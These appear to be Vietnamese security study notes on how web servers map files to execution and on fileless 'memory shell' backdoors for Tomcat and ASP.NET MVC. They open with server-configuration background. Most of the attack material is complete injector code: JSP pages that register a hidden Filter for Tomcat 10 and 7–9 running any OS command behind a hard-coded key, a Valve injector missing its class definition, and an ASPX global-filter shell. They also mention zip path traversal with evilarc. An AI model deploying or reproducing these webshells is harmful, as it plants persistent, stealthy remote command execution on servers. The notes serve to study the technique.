## kiến thức nền tảng về  Tomcat Web Server
### 1. Các khái niệm cốt lõi

- Compiler (trình biên dịch ) : chuyển đổi toàn bộ mã nguồn sang ngôn ngữ máy một lần duy nhất trước khi chạy, giúp chương trình thực thi nhanh hơn.
- Interpreter(trình thông dịch ) dịch và thực thi từng dòng mã nguồn tại thời điểm chạy, giúp phát hiện lỗi nhanh nhưng tốc độ thực thi thường chậm hơn
- Storage: file được lưu trữ ở  một thư mục trên server nhưng thư mục đó không có quyền thực thi 
- Execution: file được lưu trữ và có quyền thực thi


### 2. mô hình xử lý File của Web Server
- Mô hình ánh xạ trực tiếp (PHP):
    - các trình xử lý được cấu hình sẵn : khi thấy đuôi **.php** nó không đọc file tĩnh mà đẩy cho **PHP Engine** dịch và chạy code
- Mô hình định tuyến bộ nhớ (C# ASP.NET Core, Java Spring Boot, Python) : 
    - Ứng dụng chạy như một tiến trình độc lập. URL được định tuyến (route) vào các hàm (Controller) trong mã nguồn, chứ không trỏ thẳng xuống file vật lý.
    - Để phục vụ file ảnh/tài liệu, ứng dụng phải mở các thư mục tĩnh (ví dụ wwwroot hoặc cấu hình Static Files Middleware). Mọi file nằm trong thư mục này đều bị coi là văn bản tĩnh, dù có là file .cs hay .java thì Web Server cũng chỉ trả về dạng text chứ không tự động biên dịch và chạy.

### 3. Cách 1 web server nhận diện một file để thực thi hay hiển thị ở dạng text .

- nguyên lý cốt lõi : nó chỉ dựa vào **cấu hình mapping được thiết lập sẵn**
![image](https://hackmd.io/_uploads/rJvWe_7Tbg.png)

- đây là giai đoạn THỰC THI
#### 1. PHP — Apache & Nginx
1.1 Apache 
- dùng cơ chế **Handler Mapping** trong **httpd.conf** hoặc **.htacces** . 
    -  **.htacces** <distributed configuration files> : Cho phép thay đổi c**ấu hình riêng biệt cho từng thư mục**, bằng cách đ**ặt file cấu hình vào thư mục đó**, và các thiết lập sẽ áp dụng cho thư mục đó cùng toàn bộ thư mục con của nó.NÓ LÀ CẤU HÌNH Ở MỨC THƯ MỤC 
        - Sử dụng directive **AddHandler** để map extension name  to the specified handler .
            - syntax : `AddHandler handler-name extension [extension]`
            - VD : `AddHandler application/x-httpd-php .php .hehe`
        - sử dụng **FilesMatch** + **SetHandler**
            - VD : `<FilesMatch "\.(php|hehe)$">
    SetHandler application/x-httpd-php
</FilesMatch>`
     -  directive **AccessFileName** trong Apache là directive cho phép cấu hình cái tên file mà web server tìm file cấu hình theo thư mục . Nó được cấu hình ở file như : apache2.conf , httpd.conf . CÁC FILE NÀY LÀ CẤU HÌNH Ở MỨC SERVER . 
 - điểm yếu xảy ra khi bị ghi đè file cấu hình .    
1.2 Nginx
- không có khái niệm handler như Apache . chạy code thì phải gọi engine tương ứng dựa vào cấu hình của file **nginx.conf** . Cấu hình này nằm trong **Server block** , được cấu hình ở **location block** 
- ví dụ : ![image](https://hackmd.io/_uploads/SyQbJjX6Zg.png)

- điểm yếu xảy ra khi Web server bị cấu hình lỏng lẻo ở **location**

    
#### 2. JAVA 
2.1: TOMCAT
- Kiến trúc của tomcat khác với apache hay nginx , nó được thiết kế để chạy **Java Servlet**, chứ không phải là một web server đa năng
- Tomcat sử dụng cơ chế **Servlet Mapping** dựa trên URL Pattern.
    - **DefaultServlet** : Được map với pattern / (tức là mọi request không khớp với các quy tắc khác). Nhiệm vụ của nó là tìm file trên ổ cứng (như .jpg, .css, .html), đọc nội dung và trả về cho trình duyệt.** Nó không bao giờ thực thi code.**
    - **JspServlet**: Được map mặc định với các pattern *.jsp và *.jspx. Nhiệm vụ của nó là:
        - Nhận file JSP từ ổ cứng.
        - Dịch file đó ra thành một file mã nguồn Java (.java).
        - Biên dịch nó thành file .class (Bytecode).
        - Nạp vào bộ nhớ (RAM) và thực thi.
- trong các dự án cũ thì cấu hình sevletmapping được cấu hình ở file web.xml. NHƯNG trong các dự án spring boot , mặc định không hỗ trợ JSP . Upload shell.jsp để RCE gần như không thể . 
- CASE : hỗ trợ JSP
    - nhận biết : trong file web.xml <nơi cấu hình > . 
    ![image](https://hackmd.io/_uploads/S1wMO6mpbx.png)
#### 3. C#
3.1 : IIS
- có **Handler Mapping** để quyết định 1 file **.asp** có được thực thi hay không? 
    - web.config : ![image](https://hackmd.io/_uploads/HJ3qATXTWe.png)

    
3.2 :Kestrel
- việc một file **.asp** có thể thực thi hay không dựa vào các **Middleware**  . Khi request đến **Static Files Middleware** thì Lớp này sẽ tra cứu đuôi **.asp** trong một từ điển gọi là **FileExtensionContentTypeProvider** để tìm MIME Type (mặc định là không có ). Được viết ở Program.cs (file do DEV viết ở phần BE )
- ASP.NET Core không có khả năng hiểu và thực thi file .asp. Nó dựa vào việc do DEV viết 
    
    
### VECTOR  tấn công 
#### 1. Upload 1 file nén nếu BE có code hỗ trợ giải nén để tận dụng path travel để ghi đè các file cấu hình . 
    - công cụ hỗ trợ : **evilarc**
    
## Memory shelll
sơ đồ cấu trúc các thành phần của Apache Tomcat
![image](https://hackmd.io/_uploads/SyilcPDaWl.png)
- frame Spring nằm ở phần `Context`
- điều kiên : VICTIM phải có 1 lỗ hổng RCE đươc như upload file , deserialize , SSTI , ...
- Khái niệm : Memory shelll là trapdoor mà không cần file (file-free) , tính năng chính của nó chỉ hoạt động ở memory của server và không tạo bất kì file nào trên ở cứng (disk)
**1. Tomcat web server**
**1.1 : Các thành phần , quy tắc cốt lõi**
- khi một java web container được ServletContext khởi động , các thành phần  chính như **ServletContext** , **FilterChain** , **Valve** sẽ "cư trú" ở memory để hỗ trợ các luồng xử lý request của toàn bộ ứng dụng web
 - Bản chất  là inject các thành phân độc hại vào các core component này thông qua **reflection, bytecode manipulation, class loader hijacking**   
- Các phương pháp can thiệp vào memory
    + container level : 
        - **StandardContext** của tomcat hay là **ContextHandler** của Jetty là các entry point của ứng dụng . Khi lấy  được các Object này (có sẵn trong RAM) thì có thể dùng **javareflection** để gọi các API nội bộ để đăng kí các malicious components vào memory của ứng dụng.
    + chuỗi xử lý request : 
        -  Các thành phần như **Filter, Listener, Servlet** là những mắt xích bắt buộc trong việc xử lý yêu cầu HTTP. Việc chèn mã độc vào các nút này cho phép kẻ tấn công chặn (intercept) và chỉnh sửa (tamper) toàn bộ lưu lượng truy cập.
    + Cơ chế nạp lớp (Class loading mechanism): 
        - Bằng cách sử dụng các trình nạp lớp tùy chỉnh (ví dụ: **WebappClassLoader** của Tomcat), kẻ tấn công có thể nạp các lớp (class) độc hại mà không gây xung đột với các lớp hiện có của ứng dụng, đồng thời vượt qua được các danh sách trắng (whitelist) hạn chế nạp lớp.
**2. phân loại**
    
![image](https://hackmd.io/_uploads/H1XuObBp-e.png)

### Các core API

**1. org.apache.catalina.core.StandardContext**
- Tomcat's Web application context implementation class, which provides methods such as **addFilterDef(), addFilterMapDecoded(), filterstart()**, etc., and is the core injection entrance of the Filter memory horse
- cấu hình Filter trong file web.xml, Tomcat cuối cùng cũng sẽ đọc file đó và gọi các hàm này để nạp Filter vào hệ thống. Kẻ tấn công sẽ sử dụng kỹ thuật Java Reflection để tóm lấy đối tượng StandardContext đang chạy ngầm trong RAM, sau đó tự gọi các hàm addFilter... này để đăng ký một Filter độc hại. Bằng cách này, Filter mã độc được nạp thẳng vào hệ thống mà không cần đụng chạm gì đến file cấu hình trên ổ cứng.

**2. org.apache.catalina.valves.ValveBase**
- Lớp cơ sở trừu tượng (Abstract Base Class) của Tomcat Valve. Một Valve độc hại tùy chỉnh chỉ cần kế thừa lớp này và triển khai phương thức **invoke()** là có thể đánh chặn mọi yêu cầu (request)
- Valve nằm ở tầng rất sâu của Tomcat (xử lý luồng giao thức trước khi đẩy lên tầng ứng dụng). Kẻ tấn công chỉ cần viết một class kế thừa ValveBase, ghi đè hàm invoke() để nhét lệnh độc hại vào, sau đó dùng Reflection ép Tomcat thêm Valve này vào đường ống (Pipeline). Vì nó chạy trước cả Filter/Servlet, các hệ thống phòng vệ ứng dụng thường bị mù trước loại tấn công này.
    
**3. org.apache.catalina.loader.WebappClassLoaderBase**
- Bộ nạp lớp (ClassLoader) ứng dụng của Tomcat. Thông qua việc đánh cắp (hijack) lớp này, có thể đạt được việc nạp các lớp độc hại mà không cần file (fileless loading).
- Trong Java, **ClassLoader** là bộ phận chịu trách nhiệm đọc các file **.class** hoặc **.jar** và nạp vào bộ nhớ RAM để chạy. Bằng cách thao túng **WebappClassLoaderBase**, kẻ tấn công có thể gửi một mảng byte (chứa mã độc) qua mạng HTTP, sau đó ép ClassLoader trực tiếp dịch mảng byte đó thành một Class đang chạy trên RAM. Kết quả là mã độc hoạt động trơn tru mà không hề có bất kỳ file mã độc nào bị rớt xuống ổ cứng, giúp né tránh hoàn toàn các phần mềm diệt virus quét file tĩnh.
    
**4. javax.servlet.ServletContext**
- Giao diện ngữ cảnh ứng dụng Web theo tiêu chuẩn Java EE. Nó cung cấp các API công khai như addServlet(), addFilter(), v.v., và là nền tảng thực hiện của Memory Shell thế hệ đầu tiên.
- Bắt đầu từ Servlet API 3.0, Java cho phép các lập trình viên đăng ký động Servlet/Filter ngay trong code (thay vì phải viết vào web.xml) thông qua các hàm như addServlet(). Kẻ tấn công đã lợi dụng chính tính năng hợp pháp này để nhúng Web Shell. Vì đây là API công khai (public API), việc code rất dễ dàng, nhưng bù lại cũng rất dễ bị các phần mềm giám sát an ninh (như RASP) bắt quả tang.
- là **context** của web application nhưng chỉ là **facade** , nhưng nó thuôc tính thuộc tính **context** được khai báo trong class này và có kiểu dữ liệu **org.apache.catalina.core.ApplicationContext** và thông qua đây có thể truy cập được **StandardContext** *(Lớp lõi, thực thi mọi logic quản lý của Tomcat.)*
![image](https://hackmd.io/_uploads/ryYnb6Hp-x.png)
    
**4.1 : StandardContext**
- nó sở hữu và quản lý các thành phần cốt lõi của một ứng dụng web.
    + Quản lý Servlet:
    + Quản lý Đường dẫn (URL Mapping):
    + Quản lý Filter:Gọi **addFilterDef()** để định nghĩa filter và **addFilterMap()** để xác định URL pattern cho filter đó
    + Quản lý Listener:
    + Quản lý Session và Classloader:

    
**4.2: muối quan hệ giữa ApplicationContextFacade , ApplicationContext , StandardContext**
    
**4.2.1: Lớp ApplicationContextFacade (lớp vỏ bọc)**
    ![image](https://hackmd.io/_uploads/BkUUkWU6bx.png)
**4.2.2 : Lớp ApplicationContext (tầng triển khai ServletContext)**
    ![image](https://hackmd.io/_uploads/SyJFkbIabe.png)
**4.2.3 : Lớp StandardContext (bộ não điều khiển)**
    ![image](https://hackmd.io/_uploads/ryZ3yW8pZl.png)

### thực nghiệm
#### 1. Filter-based Web Shell 
    
- điều kiện : Lab có lỗ hổng upload file 
    - hỗ trợ JSP engine
    - lưu file người dùng vào trong thư mục được mapping với  **Context Root**( Là đường dẫn URL gốc mà người dùng truy cập )
    - JDK version : 17 - 21
    - Tomcat version : 10.x+
    - spring boot : 3.x
    **note** : chú ý đến version  của Tomcat web server (ảnh hướng để core API) và cách  wraper của từng version của spring boot (ảnh hưởng bởi cách wrap)
    cheet sheet:![image](https://hackmd.io/_uploads/HJWGS4PpWl.png)

- **shell.jsp (spring boot 3.x và tomcat 10):**
```
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="jakarta.servlet.*" %>
<%@ page import="java.io.*" %>


<%
    out.println("<h3>bat dau qua trinh Inject Memory Shell ...</h3>");

    try {
        // 1. KỸ THUẬT BÓC 2 LỚP ĐỂ LẤY StandardContext
        // Lớp 1: Lấy ApplicationContextFacade
        ServletContext facade = request.getServletContext();

        // Bóc Lớp 1 -> Lấy ApplicationContext
        Field facadeContextField = facade.getClass().getDeclaredField("context");
        facadeContextField.setAccessible(true);
        Object applicationContext = facadeContextField.get(facade);

        // Bóc Lớp 2 -> Lấy StandardContext (Lõi)
        Field appContextField = applicationContext.getClass().getDeclaredField("context");
        appContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) appContextField.get(applicationContext);


        // 2. Tạo Filter độc hại (Kịch bản 1)
        Filter maliciousFilter = new Filter() {
            public void init(FilterConfig filterConfig) throws ServletException {}
            public void destroy() {}
            public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
                String key = req.getParameter("key");
                String cmd = req.getParameter("cmd");

                // Xác thực mật khẩu
                if ("mem_shell_2024".equals(key) && cmd != null) {
                    Process p = Runtime.getRuntime().exec(cmd);
                    InputStream in = p.getInputStream();
                    byte[] b = new byte[1024];
                    int len;
                    resp.getWriter().println("--- Memory Shell Executed ---");
                    while ((len = in.read(b)) != -1) {
                        resp.getWriter().write(new String(b, 0, len));
                    }
                    return; // Ngắt luồng
                }
                chain.doFilter(req, resp);
            }
        };

        // 3. Đăng ký Filter vào StandardContext
        String filterName = "TangHinhFilter";

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(maliciousFilter.getClass().getName());
        filterDef.setFilter(maliciousFilter);
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        // Ép Filter lên đầu hàng đợi
        standardContext.addFilterMapBefore(filterMap);

        // 4. Kích hoạt Filter
        Method filterStartMethod = StandardContext.class.getDeclaredMethod("filterStart");
        filterStartMethod.setAccessible(true);
        filterStartMethod.invoke(standardContext);

        out.println("<h3 style='color:green'>[+] Inject thành công! Chúc mừng bạn đã cấy Memory Shell vào lõi Tomcat.</h3>");

    } catch (Exception e) {
        out.println("<h3 style='color:red'>[-] Inject thất bại: " + e.getMessage() + "</h3>");
    }
%>

```
- luồng logic : 
    - sử dụng java reflection để lấy **standardContext**
    - Tạo một filter bằng **Filter** class (cấu hình RCE ở đây) - cấu hình action
    - sử dụng **FilterDef() , FilterMap()** để cấu hình profile cho filter
    - sử dụng **addFilterMapBefore** để thêm filter vào đầu của filter chain
    - sử dụng **filterStart()** để kích hoạt filter đươc thêm vào . 

- **shell.jsp (tomcat 7.x , 8.x , 9.x spring boot 2.x.x):**
```
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%-- SỬ DỤNG javax CHO SPRING BOOT 2.X / TOMCAT 7-8-9 --%>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.*" %>

<%
    out.println("<h3>Bắt đầu quá trình Inject Memory Shell (Legacy Version: Tomcat 7/8/9)...</h3>");

    try {
        // 1. Lấy StandardContext (Trong Tomcat 9 trở xuống, cấu trúc Facade đơn giản hơn)
        ServletContext servletContext = request.getServletContext();
        StandardContext standardContext = null;

        // Kỹ thuật lấy StandardContext linh hoạt cho nhiều bản Tomcat
        // Thường servletContext chính là ApplicationContextFacade
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        Object appCtx = contextField.get(servletContext); // Lấy ApplicationContext
        
        Field stdCtxField = appCtx.getClass().getDeclaredField("context");
        stdCtxField.setAccessible(true);
        standardContext = (StandardContext) stdCtxField.get(appCtx); // Lấy StandardContext lõi

        // 2. Tạo Filter độc hại bằng Lớp ẩn danh (Dùng javax.servlet)
        Filter maliciousFilter = new Filter() {
            public void init(FilterConfig filterConfig) throws ServletException {}
            public void destroy() {}
            public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
                String key = req.getParameter("key");
                String cmd = req.getParameter("cmd");
                
                if ("mem_shell_2024".equals(key) && cmd != null) {
                    Process p = Runtime.getRuntime().exec(cmd);
                    InputStream in = p.getInputStream();
                    byte[] b = new byte[1024];
                    int len;
                    resp.getWriter().println("--- Legacy Memory Shell Executed ---");
                    while ((len = in.read(b)) != -1) {
                        resp.getWriter().write(new String(b, 0, len));
                    }
                    return;
                }
                chain.doFilter(req, resp);
            }
        };

        // 3. Đăng ký Filter vào StandardContext
        String filterName = "LegacyFilter";
        
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(maliciousFilter.getClass().getName());
        filterDef.setFilter(maliciousFilter);
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        
        // SỬ DỤNG addFilterMapDecoded (Chỉ có trên Tomcat 7/8/9)
        // Phương thức này giúp nạp trực tiếp cấu hình Mapping vào bộ nhớ đã giải mã
        standardContext.addFilterMapDecoded(filterMap);

        // 4. Kích hoạt Filter bằng phương thức filterStart
        Method filterStartMethod = StandardContext.class.getDeclaredMethod("filterStart");
        filterStartMethod.setAccessible(true);
        filterStartMethod.invoke(standardContext);

        out.println("<h3 style='color:green'>[+] Inject thành công trên Tomcat Legacy!</h3>");

    } catch (Exception e) {
        out.println("<h3 style='color:red'>[-] Inject thất bại: " + e.getMessage() + "</h3>");
    }
%>
```
- luồng logic : 
    - sử dụng java reflection để lấy **standardContext**
    - Tạo một filter bằng **Filter** class (cấu hình RCE ở đây) - cấu hình action
    - sử dụng **FilterDef() , FilterMap()** để cấu hình profile cho filter
    - sử dụng **addFilterMapDecoded** để thêm filter vào filter chain có thể sử dụng **addFilterMap** để thay thế . Sự khác nhau ở đây là hỗ trợ decode url và không hỗ trợ
    - sử dụng **filterStart()** để kích hoạt filter đươc thêm vào . 
    
 kết quả :
![image](https://hackmd.io/_uploads/r11W6EvpZl.png)
![image](https://hackmd.io/_uploads/BJLWaND6Wl.png)

    
#### 2. Valve Memory Shell
- nhúng một cái **Valve** thẳng vào pipeline  của Context hoặc Host. (trong sơ đồ cấu trúc)
- lý thuyết cơ bản:
    + Valve là một danh sách liên kết với node cuối cùng luôn là [Basic Valve] : **[Valve X] → [Valve Y] → [Basic Valve]**
    + một Valve được khới tạo thông qua **abstract class ValveBase**
    + pipeline là một cái container chứa  Valve chain. **StandardPipeline class** có **public void addValve(Valve valve)** method 
        + method này thêm 1 Valve mới ngay trước [Basic Valve] 
    + ý tưởng:
        - tạo một **malicious_Valve extends ValveBase**
        - dùng java Reflection để lấy được đối tượng **StandardContext** đang chạy
        - từ **StandardContext** gọi method **getPipeline()** , method trả về type **Pipeline** (Lúc này **pipeline** chính là một đối tượng của class **StandardPipeline**)
        - sau khi có đươc đối tượng của class **StandardPipeline** gọi method **addValve()**
    
- nội dung shell:
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%-- TỐI ƯU IMPORT: Gọi đích danh các "vũ khí" cần thiết --%>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="jakarta.servlet.ServletException" %>
<%@ page import="jakarta.servlet.ServletContext" %>

<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
%>

<%
    out.println("<h3>Bat dau qua trinh Inject Valve Shell ...</h3>");

    try {
        // 1. KỸ THUẬT BÓC 2 LỚP ĐỂ LẤY StandardContext
        ServletContext facade = request.getServletContext();

        // Bóc Lớp 1 -> Lấy ApplicationContext
        Field facadeContextField = facade.getClass().getDeclaredField("context");
        facadeContextField.setAccessible(true);
        Object applicationContext = facadeContextField.get(facade);

        // Bóc Lớp 2 -> Lấy StandardContext (Lõi)
        Field appContextField = applicationContext.getClass().getDeclaredField("context");
        appContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) appContextField.get(applicationContext);

        // 2. TẠO VAN MÃ ĐỘC
        MaliciousValve maliciousValve = new MaliciousValve();

        // 3. CHÈN VÀO ĐƯỜNG ỐNG
        Pipeline pipeline = standardContext.getPipeline();
        // SỬA LỖI 2: Viết đúng chính tả pipeline
        pipeline.addValve(maliciousValve);

        out.println("<h3 style='color:green'>[+] Inject thanh cong .</h3>");

    } catch (Exception e) {
        out.println("<h3 style='color:red'>[-] Inject that bai : " + e.getMessage() + "</h3>");
    }
%>
```
kết quả : truy cập url bất  kì với **?key=mem_shell_2024&&cmd=lenh_os**
![image](https://hackmd.io/_uploads/HJAz52wpbx.png)


## Tìm hiểu về memory shell ASP.NET MVC
### 1. filter memory shell
-  chèn một malicious filter vào **System.Web.Mvc.GlobalFilterCollection** trong class nào có **public void Add(object filter)** và **private void AddInternal(object filter . int? order)** để thêm filter.
![image](https://hackmd.io/_uploads/B18iiOOaWg.png)

- các loại filter :+1: 
    - ![image](https://hackmd.io/_uploads/S1vnd_d6-e.png)
    - ![image](https://hackmd.io/_uploads/S1GyhjuTbx.png)
    - ![image](https://hackmd.io/_uploads/HkAy2iO6Wg.png)
    - ![image](https://hackmd.io/_uploads/Hkdlhidpbe.png)
    - ![image](https://hackmd.io/_uploads/B1zZ2jdTWl.png)
- Malicious_shell.aspx
```
<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web.Mvc" %>
<script runat="server">
    public class MyAuthFilter : IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            String cmd = filterContext.HttpContext.Request.QueryString["cmd"];
            if (cmd != null)
            {
                HttpResponseBase response = filterContext.HttpContext.Response;
                Process p = new Process();
                p.StartInfo.FileName = cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }


            Console.WriteLine("auth filter inject");
        }
    }
</script>
<%
    GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;
    globalFilterCollection.Add(new MyAuthFilter(), -2);
%>
```

- ý tưởng:
    - tạo một maliciousAuthenFilter nhận tham số cmd từ request và thêm maliciousAuthenFilter vào GlobalFilterCollection . 